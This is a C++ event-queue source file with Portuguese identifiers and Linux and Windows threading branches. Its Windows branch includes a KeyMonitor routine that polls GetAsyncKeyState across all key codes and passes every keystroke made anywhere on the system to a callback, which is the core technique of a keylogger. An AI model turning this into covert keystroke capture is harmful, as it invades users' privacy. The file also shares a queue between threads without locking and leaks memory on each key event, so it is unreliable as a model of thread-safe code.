#include "Events.h"
    Events* Events::static_Acess;
#ifdef __linux__

    /*
        Construtor Eventos
    */
    Events::Events(){
        //this->Debug=Debug;
        this->rodando=0;
        Events::static_Acess=this;
        pthread_create(&this->executor,0,Events::ExecutorF,this);

    }

    void Events::addEvent(Event *E){
        this->Leventos[E->ID]=E;
    }

    void Events::sendSignal(int ID){
        if(this->Leventos[ID]==NULL){
            return;
        }
        this->LEDP.push_back(ID);
        this->rodando=true;
        
    }

    void* Events::ExecutorF(void* arg){
        Events *This=(Events*)arg;
            while(true){
            lim:
            if(!This->rodando){
                sleep(1);
                goto lim;
            }
            if(This->LEDP.empty()){
                This->rodando=false;
                goto lim;
            }
            This->rodando=true;
            Event *Atual = This->Leventos[This->LEDP.front()];
            Atual->funcao(Atual->parametros);
            This->LEDP.pop_front();
        }
    }
    Event* Events::getEvent(int id){
        return this->Leventos[id];
    }
    /*
        Construtor Evento
    */
    Event::Event(int ID,void(*funcao)(void*),void *parametro){
        this->funcao=funcao;
        this->ID=ID;
        this->parametros=parametro;
    }
    Event::Event(int ID,void(*funcao)(void*)){
        this->funcao=funcao;
        this->ID=ID;
        this->parametros=NULL;
    }
#elif _WIN32
    /*
        Construtor Eventos
    */
    Events::Events(){
        //this->Debug=Debug;
        this->rodando=0;
        this->Paralel=false;
        Events::static_Acess=this;
        _beginthread(Events::ExecutorF,0,this);

    }

    void Events::addEvent(Event *E){
        this->Leventos[E->ID]=E;
    }

    void Events::sendSignal(int ID){
        if(this->Leventos[ID]==NULL){
            return;
        }
        this->LEDP.push_back(ID);
        this->rodando=true;
        
    }

    void Events::ExecutorF(void* arg){
        Events *This=(Events*)arg;
        while(true){
            lim:
            while(!This->rodando){
                Sleep(500);
            }
            if(This->LEDP.empty()){
                This->rodando=false;
                goto lim;
            }
            This->rodando=true;
            Event *Atual = This->Leventos[This->LEDP.front()];
            //single process
            if(!This->Paralel)
                Atual->funcao(Atual->parametros);
            else
                _beginthread(Atual->funcao,0,Atual->parametros);
            This->LEDP.pop_front();
        }
    }

    void Events::KeyMonitor(void* arg){
        Events *This=(Events*)arg;
        while (true) {						
            Sleep(100);
            for (int i = 8; i <= 255; i++) {
                if (GetAsyncKeyState(i) == -32767) {
                    int *x = (int*)malloc(sizeof(int));
                    *x = i; 
                    This->getEvent(159753)->parametros = x;
                    This->sendSignal(159753);
                }					
            }
        }
    }

    Event* Events::getEvent(int id){
        return this->Leventos[id];
    }
    void Events::OnKeyMonitor(void(*funcao)(void*)){
        if(!this->KeySMonitor){
            this->addEvent(new Event(159753,funcao));
            _beginthread(Events::KeyMonitor,0,this);
        }
    }

    /*
        Construtor Evento
    */
    Event::Event(int ID,void(*funcao)(void*),void *parametro){
        this->funcao=funcao;
        this->ID=ID;
        this->parametros=parametro;
    }
    Event::Event(int ID,void(*funcao)(void*)){
        this->funcao=funcao;
        this->ID=ID;
        this->parametros=NULL;
    }
#endif